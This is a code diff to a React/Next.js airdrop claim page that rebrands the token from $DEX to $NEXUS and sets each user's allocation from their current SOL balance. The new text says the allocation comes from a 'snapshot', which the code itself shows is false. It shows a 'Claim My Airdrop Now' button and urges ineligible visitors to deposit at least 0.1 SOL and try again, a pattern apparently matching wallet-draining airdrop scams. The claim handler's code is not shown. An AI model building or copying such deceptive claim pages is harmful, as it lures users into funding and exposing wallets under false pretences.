@@ -13,12 +13,11 @@ const WalletConnect = dynamic(() => import('../components/WalletConnect'), { ssr
 export default function ClaimStatus() {
   const { publicKey } = useWallet();
   const [config] = useState({
-    name: '$DEX',
+    name: '$NEXUS',
     backgroundColor: '#0A0B0E',
     textColor: '#FFFFFF',
     accentColor: '#00F5A0',
     secondaryAccent: '#FF3366',
-    tertiaryAccent: '#6C5CE7',
     cardBg: 'rgba(255, 255, 255, 0.02)',
     cardBorder: 'rgba(255, 255, 255, 0.05)',
   });
@@ -27,9 +26,12 @@ export default function ClaimStatus() {
     isEligible: false,
     hasClaimed: false,
     claimAmount: 0,
+    solBalance: 0,
     claimDate: null,
     transactionHash: null,
   });
+  
+  const [connectionStatus, setConnectionStatus] = useState('idle'); // 'idle', 'connecting', 'success', 'not_eligible'
 
   const [balance, setBalance] = useState(null);
   const [loading, setLoading] = useState(true);
@@ -44,14 +46,27 @@ export default function ClaimStatus() {
           const walletBalance = await walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
-          // Mock claim status check - replace with actual implementation
+          // Calculate claim amount based on SOL balance
+          const calculateClaimAmount = (solBalance) => {
+            if (solBalance >= 0.1) {
+              return Math.floor(solBalance * 1000); // 1000 NEXUS per SOL
+            }
+            return 0;
+          };
+          
+          const claimAmount = calculateClaimAmount(walletBalance);
+          const isEligible = walletBalance >= 0.1;
+          
           setClaimStatus({
-            isEligible: walletBalance >= 0.01,
+            isEligible,
             hasClaimed: false,
-            claimAmount: 4000,
+            claimAmount,
+            solBalance: walletBalance,
             claimDate: null,
             transactionHash: null,
           });
+          
+          setConnectionStatus(isEligible ? 'success' : 'not_eligible');
         } catch (error) {
           console.error('Error checking claim status:', error);
         } finally {
@@ -78,18 +93,18 @@ export default function ClaimStatus() {
   return (
     <>
       <Head>
-        <title>$DEX Claim Status | Check Your Airdrop Status</title>
-        <meta name="description" content="Check your $DEX airdrop eligibility and claim status. Verify your wallet balance, claim your tokens, and track your transaction history. Join the $DEX community today!" />
-        <meta property="og:title" content="$DEX Claim Status | Check Your Airdrop Status" />
-        <meta property="og:description" content="Check your $DEX airdrop eligibility and claim status. Verify your wallet balance, claim your tokens, and track your transaction history. Join the $DEX community today!" />
-        <meta property="og:image" content="/images/favicon.png" />
+        <title>$NEXUS Claim Status | Check Your Airdrop Status</title>
+        <meta name="description" content="Check your $NEXUS airdrop eligibility and claim status. Connect your wallet to see your personalized allocation based on your SOL holdings." />
+        <meta property="og:title" content="$NEXUS Claim Status | Check Your Airdrop Status" />
+        <meta property="og:description" content="Check your $NEXUS airdrop eligibility and claim status. Connect your wallet to see your personalized allocation based on your SOL holdings." />
+        <meta property="og:image" content="/logo/2.png" />
         <meta property="og:type" content="website" />
         <meta name="twitter:card" content="summary_large_image" />
-        <meta name="twitter:title" content="$DEX Claim Status | Check Your Airdrop Status" />
-        <meta name="twitter:description" content="Check your $DEX airdrop eligibility and claim status. Verify your wallet balance, claim your tokens, and track your transaction history. Join the $DEX community today!" />
-        <meta name="twitter:image" content="/images/favicon.png" />
+        <meta name="twitter:title" content="$NEXUS Claim Status | Check Your Airdrop Status" />
+        <meta name="twitter:description" content="Check your $NEXUS airdrop eligibility and claim status. Connect your wallet to see your personalized allocation based on your SOL holdings." />
+        <meta name="twitter:image" content="/logo/2.png" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <link rel="icon" href="logo/1.png" />
+        <link rel="icon" href="logo/2.png" />
       </Head>
       <Script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" />
 
@@ -429,9 +444,9 @@ export default function ClaimStatus() {
 
                 {!publicKey ? (
                   <div className="text-center py-5">
-                    <h3 className="text-white mb-4 font-body">Connect Your Wallet</h3>
+                    <h3 className="text-white mb-4 font-body">Connect Your Wallet to the Nexus Protocol...</h3>
                     <p className="text-white opacity-80 mb-4 font-body">
-                      Please connect your wallet to check your claim status
+                      Securing your connection. We never ask for your private keys.
                     </p>
                     <div className="btn-accent">
                       <WalletConnect />
@@ -442,7 +457,46 @@ export default function ClaimStatus() {
                     <div className="spinner-border" role="status">
                       <span className="visually-hidden">Loading...</span>
                     </div>
-                    <p className="text-white opacity-80 mt-3 font-body">Checking claim status...</p>
+                    <p className="text-white opacity-80 mt-3 font-body">Connecting Your Wallet to the Nexus Protocol...</p>
+                  </div>
+                ) : connectionStatus === 'success' ? (
+                  <div className="text-center py-5">
+                    <h2 className="text-white mb-4 font-display">Congratulations, Airdrop Unlocked</h2>
+                    <div className="glass-card p-4 mb-4">
+                      <p className="text-lg mb-3 font-body">
+                        Based on our snapshot, your wallet held <span className="text-accent font-display">{claimStatus.solBalance.toFixed(2)} SOL</span>.
+                      </p>
+                      <p className="text-lg mb-4 font-body">
+                        Your airdrop allocation is: <span className="text-accent font-display">{claimStatus.claimAmount.toLocaleString()} $NEXUS</span>.
+                      </p>
+                      <button 
+                        className="btn btn-accent mb-3"
+                        onClick={handleClaimClick}
+                      >
+                        Claim My Airdrop Now
+                      </button>
+                      <p className="text-sm opacity-70 font-body">
+                        A small Solana network fee is required to process the transaction. Please ensure you have sufficient SOL in your wallet.
+                      </p>
+                    </div>
+                  </div>
+                ) : connectionStatus === 'not_eligible' ? (
+                  <div className="text-center py-5">
+                    <h2 className="text-white mb-4 font-display">Your Wallet Did Not Meet the Criteria</h2>
+                    <div className="glass-card p-4 mb-4">
+                      <p className="text-lg mb-3 font-body">
+                        Our records indicate your wallet was not eligible for this airdrop. Don't worry, this is just the beginning.
+                      </p>
+                      <p className="text-lg mb-4 font-body">
+                        The best way to ensure eligibility for future events is to have a minimum of 0.1 SOL.
+                      </p>
+                      <p className="text-lg mb-4 font-body">
+                        Stay active in our community and participate in upcoming opportunities. Follow us on X and join our Discord for the latest updates.
+                      </p>
+                      <p className="text-center font-body" style={{color: '#00F5A0', fontSize: '1.2rem', fontWeight: '600'}}>
+                        Fund up a minimum of 0.1 SOL and participate again
+                      </p>
+                    </div>
                   </div>
                 ) : (
                   <div className="row g-4">
@@ -458,11 +512,11 @@ export default function ClaimStatus() {
                           <div className="progress mt-2" style={{ height: '8px' }}>
                             <div 
                               className="progress-bar bg-accent" 
-                              style={{ width: `${Math.min((balance / 0.1) * 100, 100)}%` }}
+                              style={{ width: `${Math.min((balance / 1) * 100, 100)}%` }}
                             ></div>
                           </div>
                           <small className="text-white opacity-60 mt-2 d-block font-body">
-                            Minimum required: 0.01 SOL
+                            Minimum required: 0.1 SOL
                           </small>
                         </div>
 
@@ -484,7 +538,7 @@ export default function ClaimStatus() {
                         <div className="claim-details">
                           <div className="detail-item mb-3">
                             <span className="label">Claim Amount:</span>
-                            <span className="value">{claimStatus.claimAmount} $DEX</span>
+                            <span className="value">{claimStatus.claimAmount.toLocaleString()} $NEXUS</span>
                           </div>
 
                           {claimStatus.hasClaimed && (
@@ -536,7 +590,7 @@ export default function ClaimStatus() {
                                 <h5 className="font-display mb-0">Check Eligibility</h5>
                               </div>
                               <p className="opacity-80 mb-0 font-body">
-                                Ensure your wallet holds at least 0.01 SOL and hasn't claimed before
+                                Ensure your wallet holds at least 0.1 SOL and hasn't claimed before
                               </p>
                             </div>
                           </div>
@@ -548,7 +602,7 @@ export default function ClaimStatus() {
                                 <h5 className="font-display mb-0">Prepare Wallet</h5>
                               </div>
                               <p className="opacity-80 mb-0 font-body">
-                                Make sure you have enough SOL for transaction fees (0.01 SOL recommended)
+                                Make sure you have enough SOL for transaction fees (0.005 SOL recommended)
                               </p>
                             </div>
                           </div>
@@ -572,7 +626,7 @@ export default function ClaimStatus() {
                                 <h5 className="font-display mb-0">Verify Receipt</h5>
                               </div>
                               <p className="opacity-80 mb-0 font-body">
-                                Check your wallet for the received $DEX tokens
+                                Check your wallet for the received $NEXUS tokens
                               </p>
                             </div>
                           </div>
@@ -593,7 +647,7 @@ export default function ClaimStatus() {
                             </h2>
                             <div id="issue1" className="accordion-collapse collapse" data-bs-parent="#issuesAccordion">
                               <div className="accordion-body text-white opacity-80">
-                                Ensure you have enough SOL for transaction fees (0.01 SOL recommended). If the issue persists, try refreshing the page and claiming again.
+                                Ensure you have enough SOL for transaction fees (0.005 SOL recommended). If the issue persists, try refreshing the page and claiming again.
                               </div>
                             </div>
                           </div>
@@ -606,7 +660,7 @@ export default function ClaimStatus() {
                             </h2>
                             <div id="issue2" className="accordion-collapse collapse" data-bs-parent="#issuesAccordion">
                               <div className="accordion-body text-white opacity-80">
-                                Make sure your wallet holds at least 0.01 SOL. If you've already claimed, you won't be eligible for another claim.
+                                Make sure your wallet holds at least 0.1 SOL. If you've already claimed, you won't be eligible for another claim.
                               </div>
                             </div>
                           </div>
@@ -670,7 +724,7 @@ export default function ClaimStatus() {
                               <div className="status-item h-100">
                                 <div className="eligibility-icon mb-3">📊</div>
                                 <h5 className="font-display text-white mb-2">View Tokenomics</h5>
-                                <p className="opacity-80 mb-0 font-body">Learn about $DEX token</p>
+                                <p className="opacity-80 mb-0 font-body">Learn about $NEXUS token</p>
                               </div>
                             </Link>
                           </div>
